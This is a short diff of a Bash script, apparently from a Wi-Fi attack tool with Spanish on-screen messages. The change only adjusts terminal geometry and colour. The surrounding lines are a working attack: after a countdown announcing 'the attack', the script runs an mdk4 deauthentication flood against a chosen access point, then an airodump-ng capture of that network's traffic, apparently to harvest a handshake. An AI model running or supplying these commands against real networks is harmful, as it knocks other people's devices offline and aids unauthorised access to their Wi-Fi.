@@ -49,8 +49,7 @@ fi
 
 clear
 sudo gnome-terminal --geometry 82x24+1300+20 -- bash requisitos/5.2.sh
-sudo gnome-terminal --geometry 80x24+1300+1000 -- bash -c "echo [#] 10 Segundos para empezar el Ataque: && sleep 10 && sudo timeout 30s mdk4 $interfaz2 d -B $bssid -c $ch"
-sudo gnome-terminal --geometry 80x24+1300+1000 -- bash -c "echo -e '\033[0;35m[#] 10 Segundos para empezar el Ataque:\033[0m' && sleep 10 && sudo timeout 30s mdk4 $interfaz2 d -B $bssid -c $ch; echo -e '\033[0m'"
+sudo gnome-terminal --geometry 82x24+1300+1000 -- bash -c "echo -e '\033[0;35m[#] 10 Segundos para empezar el Ataque:\033[0m' && sleep 10 && sudo timeout 30s mdk4 $interfaz2 d -B $bssid -c $ch; echo -e '\033[0m'"
 sudo airodump-ng -c $ch --bssid $bssid $interfaz2 --band abg -w $bssid
 Title
 echo "[#] Ultimos ajustes y Resultado"
